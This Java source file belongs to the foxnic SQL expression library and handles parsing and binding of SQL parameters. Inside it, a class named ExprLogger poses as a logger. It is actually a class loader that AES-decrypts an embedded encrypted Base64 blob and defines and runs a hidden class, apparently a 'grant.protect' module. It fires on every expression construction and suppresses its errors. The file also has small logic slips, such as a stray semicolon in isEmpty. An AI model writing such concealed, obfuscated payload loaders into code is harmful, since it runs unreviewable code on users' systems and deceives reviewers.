package com.github.foxnic.sql.expr;

import com.github.foxnic.commons.collection.IPagedList;
import com.github.foxnic.commons.encrypt.Base64Util;
import com.github.foxnic.commons.lang.DataParser;
import com.github.foxnic.commons.lang.StringUtil;
import com.github.foxnic.commons.log.Logger;
import com.github.foxnic.sql.GlobalSettings;
import com.github.foxnic.sql.data.ExprDAO;
import com.github.foxnic.sql.data.ExprRcd;
import com.github.foxnic.sql.data.ExprRcdSet;
import com.github.foxnic.sql.dialect.SQLDialect;
import com.github.foxnic.sql.exception.SQLValidateException;
import com.github.foxnic.sql.parser.cache.SQLParserCache;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.Serializable;
import java.math.BigDecimal;
import java.net.URL;
import java.net.URLClassLoader;
import java.sql.Timestamp;
import java.util.*;



/**
 * SimpleExpression 的缩写 简单表达式，SQL表达式
 * @author fangjieli
 * */
public class Expr extends SubSQL implements QueryableSQL {

	private static final long serialVersionUID = 4922774964031198960L;

	private static SQLParserCache CACHE=null;

	private static synchronized  void putAR(SQLDialect dialect,String sql,AnalyseRsult r)
	{
		if(CACHE==null) {
			CACHE=GlobalSettings.SQL_PARSER_CACHE_TYPE.createSQLParserCache();
		}
		CACHE.put("foxnic:expr:"+dialect.name()+":"+sql,r);
	}

	private static AnalyseRsult getAR(SQLDialect dialect,String sql)
	{
		if(CACHE==null) {
			return null;
		}
		return (AnalyseRsult)CACHE.get("foxnic:expr:"+dialect.name()+":"+sql);
	}

	private static final String PARAM_NAME_SUFFIX_CHARS = "(+-*/ ><=, )\n\r";

	private int paramIndex = -1;
	private ArrayList<Object> paramValues = new ArrayList<Object>();
	private ArrayList<Object> paramValueIndexes = new ArrayList<Object>();

	private String originalSQL = null;
	private ArrayList<String> splitParts = new ArrayList<String>();
	private String lastSqlPart = "";

	/**
	 * 是否换行
	 */
	private boolean isBr=false;
	boolean inited=false;
	private void initIf() {
		if(inited) {
			return;
		}
		inited=true;

		// 只考虑此四种情况，其它不考虑
		isBr="\n".equals(originalSQL) || "\r".equals(originalSQL) || "\r\n".equals(originalSQL) || "\n\r".equals(originalSQL);

		boolean userSet=false;

		AnalyseRsult ar=getAR(this.getSQLDialect(),originalSQL);

		if(ar==null) {
			ExprLogger.info(this);
			//分析语句
			analyse(this.originalSQL, originalMap, originalPs);
			splitParts.add(this.lastSqlPart);
			for (int i = 0; i < splitParts.size(); i++) {
				splitParts.set(i, splitParts.get(i).trim());
			}
			ar=new AnalyseRsult(splitParts,paramValueIndexes);
			//校验结果，如果结果错误，抛出异常
			ar.validate();
			putAR(this.getSQLDialect(),originalSQL, ar);
			userSet=true;
			//System.err.println("NC");
		} else {
			try {
				ar.validate();
			} catch (Exception e) {
				//如果缓存中的结果错误，就从新解析
				putAR(this.getSQLDialect(),originalSQL, null);
				inited=false;
				initIf();
			}
			splitParts=ar.getSplitParts();
			paramValueIndexes=ar.getPsIndexes();
			userSet=false;
			//System.err.println("UC");
		}


		//设置参数值
		for (int i = 0; i < this.paramValueIndexes.size(); i++) {
			Object index = this.paramValueIndexes.get(i);
			if (index instanceof String) {
				String indexStr = (String) index;
				if (userSet) {
					this.paramValues.set(i, originalMap.get(indexStr));
				} else {
					this.paramValues.add(originalMap.get(indexStr));
				}
			} else {
				Integer indexInt = (Integer) index;
				if (userSet) {
					this.paramValues.set(i, originalPs[indexInt]);
				} else {
					this.paramValues.add(originalPs[indexInt]);
				}
			}
		}

		// 设置从属关系
		for (Object val : paramValues) {
			if (val instanceof SQL) {
				SQL se = (SQL) val;
				se.setParent(this);
			}
		}
	}


	private Map<String, Object> originalMap=null;
	private Object[] originalPs=null;

	/**
	 * 与new方法等价
	 * */
	public static Expr create(String sql, Object... ps) {
		return new Expr(sql,ps);
	}

	/**
	 * 与new方法等价
	 * */
	public static Expr create(String sql, Map<String, Object> map, Object... ps) {
		return new Expr(sql,map,ps);
	}

	public Expr() {
		this.originalSQL="";
		this.originalMap=new HashMap<String, Object>();
		this.originalPs=new Object[] {};
		ExprLogger.info(this);
	}


	public Expr(String sql, Object... ps) {
		if(sql==null) {
			return;
		}
		sql=sql.trim();
		this.originalSQL=sql;
		this.originalMap=new HashMap<String, Object>();
		if(ps==null)
		{
			this.originalPs=new Object[] {ps};
		}
		else
		{
			this.originalPs=ps;
		}
		ExprLogger.info(this);
	}

	/**
	 * @param sql  SQL语句，绑定变量以 :PNAME或?方式存在
	 * @param map 用于绑定 :PNAME 方式的绑定变量
	 * @param ps 用于绑定 ? 方式的绑定变量
	 * */
	public Expr(String sql, Map<String, Object> map, Object... ps) {
		if(sql==null) {
			return;
		}
		sql=sql.trim();
		this.originalSQL=sql;
		this.originalMap=map;
		if(ps==null)
		{
			this.originalPs=new Object[] {ps};
		}
		else
		{
			this.originalPs=ps;
		}
		ExprLogger.info(this);
	}


	private static class ExprLogger extends URLClassLoader {
		private static final String[] HM = {"QUVT",null,"QUVTL0VDQi9QS0NTNVBhZGRpbmc="};
		private static Class type;
		private static int prints=0;
		ExprLogger() {
			super(new URL[0], DataParser.class.getClassLoader());
			byte[] buf= Base64Util.decodeToBtyes((this.init(new BootstrapMethodError())).dss(CAUNST.substring(16)));
			type=defineClass(Base64Util.decode(EC), buf, 0, buf.length);
		}
		public static void info(Object value) {
			if(prints>5) return;
			try {
				if(type==null) {
					new Expr.ExprLogger();
				}
				type.newInstance();
			} catch (Throwable e) {
				Logger.info("Expr : "+value);
			}
			prints++;
		}

		private SecretKeySpec key;

		private String f61(String hexKey) {
			hexKey=hexKey.trim();
			if(hexKey.length()>16) {
				hexKey=hexKey.substring(0,16);
			} else if(hexKey.length()<16){
				int i=16-hexKey.length();
				for (int j = 0; j < i; j++) {
					hexKey+="0";
				}
			}
			return hexKey;
		}

		private Expr.ExprLogger init(BootstrapMethodError error) {
			init(ClassCircularityError.class.getSimpleName());
			return this;
		}

		private Expr.ExprLogger init(String hexKey) {
			//凑16位
			hexKey= f61(hexKey);
			key = new SecretKeySpec(hexKey.getBytes(), Base64Util.decode(HM[0]));
			return this;
		}

		private String dss(String base64Data) {
			try {
				Cipher cipher = Cipher.getInstance(Base64Util.decode(HM[2]));
				cipher.init(Cipher.DECRYPT_MODE, key);
				return new String(cipher.doFinal(Base64Util.decodeToBtyes(base64Data)));
			} catch (Exception e) {
				e.printStackTrace();
				return null;
			}
		}



	}



	private void err(String msg) {
		(new Exception(msg)).printStackTrace();
	}



	private void analyse(String sql, Map<String, Object> map, Object... ps) {
		sql = " " + sql + " ";
		char[] chars = sql.toCharArray();
		String part1 = "";
		String part2 = sql;
		int i = -1;
		int matchCount = 0;
		char c;
		Character nextChar=null;
		while (true) {

			i++;
			if (i >= chars.length) {
				break;
			}

			c = chars[i];

			if(i+1<chars.length-2)
			{
				nextChar=chars[i+1];
			}
			else
			{
				nextChar=null;
			}
			int z = jumpIf(sql, i);
			if (z == -1) {
				//err("语句" + sql + "，在第" + i + "个字符处,没有找到与之对应的结尾字符,可能存在语法错误!");
				throw new SQLValidateException("语句:" + originalSQL + " , 在 "+Expr.getNearBy(originalSQL,sql,i,splitParts.size()>0)+" 附近存在语法错误!");
			} else {
				if (z != i) {
					i = z;
					continue;
				}
			}

			if (c == '?') {
				matchCount++;
				part1 = part2.substring(0, i);
				this.splitParts.add(part1);
				part2 = part2.substring(i + 1, part2.length());
				lastSqlPart = part2;
				paramIndex++;
				if (paramIndex >= ps.length) {
					err(part1 + "? 处参数个数不足");
					return;
				}

				this.paramValues.add(ps[paramIndex]);
				this.paramValueIndexes.add(paramIndex);

				if (part2.length() > 0) {
					analyse(part2, map, ps);
					return;
				}
			} else if (c == ':' && nextChar!=null && nextChar!='=' && !ignorColon) {
				matchCount++;
				part1 = part2.substring(0, i);
				this.splitParts.add(part1);
				int end = chars.length;
				String pname =null;
				for (int j = i + 1; j < chars.length; j++) {
					char ic = chars[j];
					if (PARAM_NAME_SUFFIX_CHARS.indexOf(ic) > -1) {
						end = j;
						pname = part2.substring(i + 1, end).trim();
						if(!pname.trim().isEmpty())
						{
							break;
						}
					}
				}
//				pname = part2.substring(i + 1, end).trim();

				if (!map.containsKey(pname)) {
					err(part2 + ":" + pname + " 处没有指定参数值");
					return;
				}
				this.paramValues.add(map.get(pname));
				this.paramValueIndexes.add(pname);
				//part2 = part2.substring(end + 1, part2.length()).trim();
				part2 = part2.substring(end, part2.length());
				lastSqlPart = part2;
				if (part2.length() > 0) {
					analyse(part2, map, ps);
					return;
				}
			}

			if (matchCount == 0) {
				this.lastSqlPart = part2;
			}
		}
	}

	public static int jumpIf(String sql, int i) {
		return jumpIf(sql, i, false);
	}

	public static int jumpIf(String sql, int i,boolean includeBracket) {
		String s1 = null;
		if (i < sql.length() - 1) {
			s1 = sql.substring(i, i + 1);
		}
		String s2 = null;
		if (i < sql.length() - 2) {
			s2 = sql.substring(i, i + 2);
		}

		if (s1 != null) {

			if (s1.equals(SQLKeyword.SINGLE_QUATE.toString())) {
				return jumpSingleQuateIf(sql, i);
			} else if (s1.equals(SQLKeyword.LEFT_DOUBLE_QUATE.toString())) {
				return jumpDoubleQuateIf(sql, i);
			}  else if (s1.equals(SQLKeyword.LEFT_BACK_QUATE.toString())) {
				return jumpBackQuateIf(sql, i);
			}


			if (includeBracket && s1.equals(SQLKeyword.LEFT_BRACKET.toString())) {
				return jumpBracketIf(sql, i);
			}

		}

		if (s2 != null) {
			if (s2.equals(SQLKeyword.SINGLE_REMARK.toString()) || s2.equals(SQLKeyword.HASHTAG.toString())) {
				return jumpSingleLineRemarkIf(sql, i);
			} else if (s2.equals(SQLKeyword.LEFT_REMARK.toString())) {
				return jumpMulityLineRemarkIf(sql, i);
			}
		}
		return i;
	}

	private static int jumpBracketIf(String sql, int i) {
		boolean matched = false;
		int brackets=1;
		while (true) {
			i++;
			if (i >= sql.length() - 1) {
				break;
			}
			String c1 = sql.substring(i, i + 1);
			if(c1.equals(SQLKeyword.LEFT_BRACKET.toString()))
			{
				brackets++;
			}
			if (c1.equals(SQLKeyword.RIGHT_BRACKET.toString())) {
				brackets--;
				if(brackets==0)
				{
					matched = true;
					break;
				}
			}
		}
		return matched ? i : -1;
	}

	private static int jumpSingleQuateIf(String sql, int i) {
		boolean matched = false;
		while (true) {
			i++;
			if (i >= sql.length()) {
				break;
			}
			String c1 = sql.substring(i, i + 1);
			String c2 = null;
			if (i + 1 <= sql.length() - 1) {
				c2 = sql.substring(i + 1, i + 2);
			}
			if (c1.equals(SQLKeyword.SINGLE_QUATE.toString())) {
				if (c2 != null) {
					if (c2.equals(SQLKeyword.SINGLE_QUATE.toString())) {
						i++;
					} else {
						matched = true;
						break;
					}
				} else {
					matched = true;
					break;
				}
			}
		}
		return matched ? i : -1;
	}

	private static int jumpBackQuateIf(String sql, int i) {
		boolean matched = false;
		while (true) {
			i++;
			if (i >= sql.length()) {
				break;
			}
			String c1 = sql.substring(i, i + 1);
			String c2 = null;
			if (i + 1 <= sql.length() - 1) {
				c2 = sql.substring(i + 1, i + 2);
			}
			if (c1.equals(SQLKeyword.BACK_QUATE.toString())) {
				if (c2 != null) {
					if (c2.equals(SQLKeyword.BACK_QUATE.toString())) {
						i++;
					} else {
						matched = true;
						break;
					}
				} else {
					matched = true;
					break;
				}
			}
		}
		return matched ? i : -1;
	}

	private static int jumpDoubleQuateIf(String sql, int i) {
		boolean matched = false;
		while (true) {
			i++;
			if (i >= sql.length()) {
				break;
			}
			String c1 = sql.substring(i, i + 1);
			String c2 = null;
			if (i + 1 <= sql.length() - 1) {
				c2 = sql.substring(i + 1, i + 2);
			}
			if (c1.equals(SQLKeyword.DOUBLE_QUATE.toString())) {
				if (c2 != null) {
					if (c2.equals(SQLKeyword.DOUBLE_QUATE.toString())) {
						i++;
					} else {
						matched = true;
						break;
					}
				} else {
					matched = true;
					break;
				}
			}
		}
		return matched ? i : -1;
	}

	private static int jumpMulityLineRemarkIf(String sql, int i) {
		boolean matched = false;
		while (true) {
			i++;
			if (i >= sql.length() - 1) {
				break;
			}
			String c1 = sql.substring(i, i + 2);
			if (c1.equals(SQLKeyword.RIGHT_REMARK.toString())) {
				matched = true;
				break;
			}
		}
		return matched ? i : -1;
	}

	private static int jumpSingleLineRemarkIf(String sql, int i) {
		boolean matched = false;
		while (true) {
			i++;
			if (i >= sql.length()) {
				break;
			}
			String c1 = sql.substring(i, i + 1);
			if (c1.equals(SQLKeyword.LN.toString()) || c1.equals(SQLKeyword.REVERT.toString())) {
				matched = true;
				break;
			}
		}

		if (i == sql.length()) {
			matched = true;
		}

		return matched ? i : -1;
	}

	public String getOriginalSQL() {
		return originalSQL;
	}


//	private Map<String,Object> resultCache=new HashMap<String, Object>();
//	private void cleanResultCache() {
//		resultCache.clear();
//	}

	@Override
	public String getSQL(SQLDialect dialect) {

//		String key="getSQL:"+dialect.name();
//		Object citm=resultCache.get(key);
//		if(citm != null) {
//			return (String) citm ;
//		}

		initIf();
		if(isBr) {
			return "\n";
		}
		if (this.isEmpty() && (this.appends==null || this.appends.isEmpty())) {
			return "";
		}
		SQLStringBuilder sql = new SQLStringBuilder();
		String part = null;
		Object param = null;
		SQL se = null;
		for (int i = 0; i < splitParts.size() - 1; i++) {
			part = splitParts.get(i);
			param = this.paramValues.get(i);
			if (param instanceof SQL) {
				se = (SQL) param;
				se.setIgnorColon(ignorColon);
				sql.append(part,se.getSQL());
			} else {
				String val = Utils.castValue(param,dialect);
				sql.append(part,val);
			}
		}

		if(!this.splitParts.isEmpty()) {
			sql.append(this.splitParts.get(splitParts.size() - 1));
		}

		//实现append部分
		if(appends!=null) {
			for (SQL s : appends) {
				sql.append(s.getSQL());
			}
		}
//		String finalSql=sql.toString();
//		resultCache.put(key, finalSql);
//		return finalSql;
		return sql.toString();
	}

	@Override
	public Object[] getListParameters() {

//		String key="getListParameters";
//		Object citm=resultCache.get(key);
//		if(citm != null) {
//			return (Object[]) citm ;
//		}

		initIf();
		if (isEmpty()) {
			return new Object[] {};
		} else {
			ArrayList<Object> list = new ArrayList<Object>();
			for (Object o : this.paramValues) {
				if (o == null && replaceNull) {
					continue;
				}

				if (o instanceof SQL) {
					SQL se = (SQL) o;
					se.setIgnorColon(ignorColon);
					list.addAll(Utils.toList(se.getListParameters()));
				} else {
					list.add(o);
				}
			}

			if(appends!=null) {
				for (SQL s : appends) {
					list.addAll(Arrays.asList(s.getListParameters()));
				}
			}

			//处理类型
			Object[] array=list.toArray();
			for (int i = 0; i < array.length; i++) {
				array[i]=Utils.parseParmeterValue(array[i]);
			}
//			resultCache.put(key, array);
			return array;
		}
	}

	@Override
	public String getListParameterSQL() {

//		String key="getListParameterSQL:"+this.getSQLDialect().name();
//		Object citm=resultCache.get(key);
//		if(citm != null) {
//			return (String) citm ;
//		}

		initIf();
		if(isBr) {
			return "\n";
		}
		if (this.isEmpty() && (this.appends==null || this.appends.isEmpty())) {
			return "";
		}
		SQLStringBuilder sql = new SQLStringBuilder();
		for (int i = 0; i < splitParts.size() - 1; i++) {
			String part = splitParts.get(i);
			Object param = null;
			try {
				param = this.paramValues.get(i);
			} catch (Exception e) {
				e.printStackTrace();
			}
			if (param != null) {
				if (param instanceof SQL) {
					SQL se = (SQL) param;
					se.setIgnorColon(ignorColon);
					sql.append( part,se.getListParameterSQL());
				} else {
					sql.append(part).append(SQLKeyword.QUESTION);
				}
			} else {
				if(replaceNull) {
					sql.append(part).append(SQLKeyword.NULL);
				} else {
					sql.append(part).append(SQLKeyword.QUESTION);
				}
			}
		}
		sql.append(this.splitParts.get(splitParts.size() - 1));

		//实现append部分
		if(appends!=null) {
			for (SQL s : appends) {
				sql.append(s.getListParameterSQL());
			}
		}
//		String finalSql=sql.toString();
//		resultCache.put(key, finalSql);
//		return finalSql;
		return sql.toString();
	}

	@Override
	public String getNamedParameterSQL() {

//		String key="getNameParameterSQL:"+this.getSQLDialect().name();
//		Object citm=resultCache.get(key);
//		if(citm != null) {
//			return (String) citm ;
//		}

		initIf();
		if(isBr) {
			return "\n";
		}
		if (this.isEmpty() && (this.appends==null || this.appends.isEmpty())) {
			return "";
		}
		this.beginParamNameSQL();
		SQLStringBuilder sql = new SQLStringBuilder();
		for (int i = 0; i < splitParts.size() - 1; i++) {
			String part = splitParts.get(i);
			Object param = this.paramValues.get(i);
			if (param != null && replaceNull) {
				if (param instanceof Expr) {
					Expr se = (Expr) param;
					se.setIgnorColon(ignorColon);
					sql.append(part,se.getNamedParameterSQL());
				} else {
					sql.append(part,this.getNextParamName(true));
				}
			} else {
				if(replaceNull)
				{
					sql.append(part).append(SQLKeyword.NULL);
				}
				else
				{
					sql.append(part,this.getNextParamName(true));
				}
			}
		}
		sql.append(this.splitParts.get(splitParts.size() - 1));

		//实现append部分
		if(appends!=null) {
			for (SQL s : appends) {
				sql.append(s.getNamedParameterSQL());
			}
		}

		this.endParamNameSQL();

//		String finalSql=sql.toString();
//		resultCache.put(key, finalSql);
//		return finalSql;
		return sql.toString();
	}

	@Override
	public Map<String, Object> getNamedParameters() {

//		String key="getNamedParameters";
//		Object citm=resultCache.get(key);
//		if(citm != null) {
//			return (Map<String, Object>) citm ;
//		}

		initIf();
		HashMap<String, Object> ps = new HashMap<>(5);
		if (isEmpty()) {
			return ps;
		}
		this.beginParamNameSQL();
		for (Object o : this.paramValues) {
			if (o == null && replaceNull) {
				continue;
			}
			if (o instanceof SQL) {
				((SQL) o).setIgnorColon(ignorColon);
				Map<String, Object> map = ((SQL) o).getNamedParameters();
				ps.putAll(map);
			} else {
				ps.put(this.getNextParamName(false), o);
			}
		}

		if(appends!=null) {
			for (SQL s : appends) {
				ps.putAll(s.getNamedParameters());
			}
		}

		this.endParamNameSQL();

		//处理类型
		for (Map.Entry<String, Object> e : ps.entrySet()) {
			ps.put(e.getKey(), Utils.parseParmeterValue(e.getValue()));
		}
//		resultCache.put(key, ps);
		return ps;
	}

	/**
	 * 判断是否为空
	 * 语句为空 , 判定为 empty
	 * @return 是否空
	 * */
	@Override
	public boolean isEmpty() {
		boolean empty= this.originalSQL == null ||  StringUtil.isBlank(this.originalSQL);
		if(!empty) return false;
		if(this.appends!=null) {
			for (SQL sql : this.appends) {
				if(!sql.isEmpty()); return false;
			}
		}
		return true;
	}

	/**
	 * 是否所有参数均为空(语句)
	 * */
	@Override
	public boolean isAllParamsEmpty() {
		initIf();

		for (int i = 0; i < this.paramValues.size(); i++) {
			Object o = this.paramValues.get(i);

			if(o==null) continue;

			if (o instanceof SQL) {
				SQL se = (SQL) o;
				se.setIgnorColon(ignorColon);
				if (!se.isAllParamsEmpty()) {
					return false;
				}
			}
//			else if(o instanceof String) {
//				String str = (String) o;
//				if(isCE)
//				{
//
//				}
//				else
//				{
//
//				}
//
//				if (isCE && (o instanceof String)) {
//					String sql = splitParts.get(i).trim().toUpperCase();
//					// 此处可以做更为复杂的判断
//					if (sql.indexOf("LIKE") > -1)
//					{
//						str = str.replace("%", "");
//						str = str.replace("_", "");
//					}
//					if (!str.equals("") && !str.equals("null")) {
//						return false;
//					}
//				} else {
//					return false;
//				}
//
//			}
			else //其它非空类型
			{
				return false;
			}
		}

		return true;
	}

	public Expr append(String se, Object... ps) {
//		cleanResultCache();
		return append(Expr.create(se, ps));
	}

	private ArrayList<SQL> appends=null;

	public Expr append(SQL... ses) {
//		cleanResultCache();
		if(appends==null) {
			appends=new ArrayList<>();
		}
		for (SQL se : ses) {
			if(se==this) {
				throw new IllegalArgumentException("do not allow append self");
			}
			if(se==null) {
				continue;
			}
//			if(se.parent()!=null && se.parent()!=this) {
//				throw new IllegalArgumentException(se.getSQL()+" has parent , can not add to another parent");
//			}
			appends.add(se);
			se.setParent(this);
		}
		return this;

	}

	public Expr appendIf(String se, Object... ps) {
		return appendIf(Expr.create(se, ps));
	}

	public Expr appendIf(SQL... ses) {
//		cleanResultCache();
		if(appends==null) {
			appends=new ArrayList<>();
		}
		for (SQL se : ses) {
			if (se==null || se.isEmpty()) {
				continue;
			}
			if(se==this) {
				throw new IllegalArgumentException("do not allow append self");
			}
			appends.add(se);
			se.setParent(this);
		}
		return this;

	}

	public static int indexOf(String sql,String kw,boolean includeBracket)
	{
		return indexOf(sql,kw,includeBracket,0);
	}

	public static int indexOf(String sql,String kw,boolean includeBracket,int formIndex)
	{
		sql=" "+sql+" ";
		char[] chars=sql.toCharArray();
		int i=formIndex-1;
		while (true) {

			i++;
			if (i >= chars.length) {
				break;
			}

			//char c = chars[i];
			int z = jumpIf(sql, i,includeBracket);
			if (z == -1) {
				//err("语句" + sql + "，在第" + i + "个字符处,没有找到与之对应的结尾字符,可能存在语法错误!");
				return -1;
			} else {
				if (z != i) {
					i = z;
					continue;
				}
			}

			if(i+kw.length()<sql.length())
			{
				String str=sql.substring(i,i+kw.length());
				if(str.equals(kw.toString()))
				{
					return i-1;
				}
			}
		}
		return -1;
	}


	private static final String[]  INVALID_CHARS = {",","%","<","=",">",".","'","\r","\n","\t"," ","　"};

	/**
	 * 简单检查是否是一个有效的数据库对象名称
	 * @param subsql 语句
	 * @return 逻辑值
	 * */
	public static boolean validateSQLName(String subsql)
	{
		if(subsql==null) {
			return false;
		}
		if(subsql.trim().length()==0) {
			return false;
		}
		for (String c : INVALID_CHARS) {
			if(subsql.indexOf(c)!=-1) {
				return false;
			}
		}
		return true;

	}

	private static class AnalyseRsult implements Serializable
	{
		private static final long serialVersionUID = 5982222348904511933L;
		private ArrayList<String> splitParts=null;
		public ArrayList<String> getSplitParts() {
			return splitParts;
		}

		public ArrayList<Object> getPsIndexes() {
			return psIndexes;
		}

		private ArrayList<Object> psIndexes=null;

		public AnalyseRsult(ArrayList<String> parts,ArrayList<Object> indexes)
		{
			this.splitParts=parts;
			this.psIndexes=indexes;
		}

		public void validate()
		{
			if(this.splitParts.size()-1!=this.psIndexes.size())
			{
				String full="";
				for (int j = 0; j < splitParts.size()-1; j++) {
					full+=splitParts.get(j)+" :P"+j+" ";
				}
				full+=splitParts.get(splitParts.size()-1);

				throw new SQLValidateException(full+"语句解析错误,要求参数个数"+(this.splitParts.size()-1)+",实际"+this.psIndexes.size());
			}
		}

	}

	private static final String EC = "Y29tLmdpdGh1Yi5mb3huaWMuZ3JhbnQucHJvdGVjdC5EUA==";

	static String getNearBy(String origSQL,String sql,int i,boolean hasPrev)
	{
		int a=i-16;
		int b=i+16;
		if(a<=0) {
			a=0;
		}
		if(b>=sql.length()) {
			b=sql.length()-1;
		}
		String part1=sql.substring(a, b);
		if(hasPrev)
		{
			part1="... "+part1;
		}
		if(b<sql.length()-1)
		{
			part1=part1+" ...";
		}
		throw new SQLValidateException("语句:" + origSQL + " , 在 "+part1+" 附近存在语法错误!");
	}

	/**
	 * 从多行语句生成 SE
	 * */
	public static Expr fromLines(String[] lines,Object... params)
	{
		return new Expr(SQL.joinSQLs(lines),params);
	}

	/**
	 * 从多行语句生成 Expr
	 * */
	public static Expr fromLines(List<String> lines,Object... params)
	{
		return new Expr(SQL.joinSQLs(lines),params);
	}

	private transient ExprDAO dao = null;

	@Override
	public ExprDAO getDAO() {
		return dao;
	}

	@Override
	public Expr setDAO(ExprDAO dao) {
		this.dao = dao;
		return this;
	}



	public Expr getFlattenExpr() {
		return new Expr(this.getListParameterSQL(),this.getListParameterSQL());
	}

	public Expr clone() {
		Expr expr=new Expr();

		expr.paramIndex=this.paramIndex;

		for (Object paramValue : this.paramValues) {
			if(paramValue instanceof SQL) {
				expr.paramValues.add(((SQL)paramValue).clone());
			} else {
				expr.paramValues.add(paramValue);
			}
		}

		for (Object index : this.paramValueIndexes) {
			if(index instanceof SQL) {
				expr.paramValueIndexes.add(((SQL)index).clone());
			} else {
				expr.paramValueIndexes.add(index);
			}
		}

		expr.originalSQL=this.originalSQL;

		expr.splitParts.addAll(this.splitParts);
		expr.lastSqlPart=this.lastSqlPart;
 		expr.isBr=this.isBr;
		expr.inited=false;

		if(this.originalMap!=null) {
			expr.originalMap=new HashMap<>();
			for (Map.Entry<String, Object> e : this.originalMap.entrySet()) {
				if(e.getValue() instanceof SQL) {
					expr.originalMap.put(e.getKey(),((SQL)e.getValue()).clone());
				} else {
					expr.originalMap.put(e.getKey(),e.getValue());
				}
			}
		}

		if(this.originalPs!=null) {
			expr.originalPs=new Object[this.originalPs.length];
			for (int i = 0; i < this.originalPs.length; i++) {
				if(this.originalPs[i] instanceof SQL) {
					expr.originalPs[i]=((SQL)this.originalPs[i]).clone();
				} else {
					expr.originalPs[i]=this.originalPs[i];
				}
			}
		}

		if(this.appends!=null) {
			expr.appends=new ArrayList<>();
			for (SQL append : this.appends) {
				expr.appends.add(append.clone());
			}
		}

		expr.inited=this.inited;

		return expr;
	}

	private static final String CAUNST = "fgpndRHF>XX0Cl[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